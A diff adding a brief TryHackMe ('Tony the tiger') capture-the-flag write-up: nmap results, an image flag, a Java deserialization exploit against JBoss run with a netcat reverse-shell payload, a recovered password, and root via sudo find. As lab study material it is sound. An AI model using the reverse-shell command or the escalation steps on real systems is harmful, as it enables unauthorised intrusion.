@@ -1,0 +1,38 @@
+10.10.42.30 | Tony the tiger | tryhackme
+
+nmap scan 
+---------
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+
+check out the 10.10.42.30:8080 jboss 
+and found the flag from the image in the blog 
+strings image | grep THM
+
+setup a listener with netcat and run the exploit in the downloaded file which takes advantage of the java serialization vulnerability and we will get a shell out of it  
+
+python exploit.py 10.10.42.30:8080 "nc -e /bin/bash 10.8.179.136 4444"                                                                                               1 ⨯
+[*] Target IP: 10.10.42.30
+[*] Target PORT: 8080
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+[+] Command executed successfully
+
+
+we have a reverse shell now 
+check out the file systems for flags 
+in the /home dorectory use :
+grep -R "THM{" * 2>/dev/null 
+to search for the flag 
+
+cd to jboss /home and we cam see a note there 
+read the note and we will get credentials
+like a boss
+
+su jboss with the password likeaboss
+
+sudo -l
+
+we can run find as root
+GTFOBins for a find exploit and running it will get us root
+
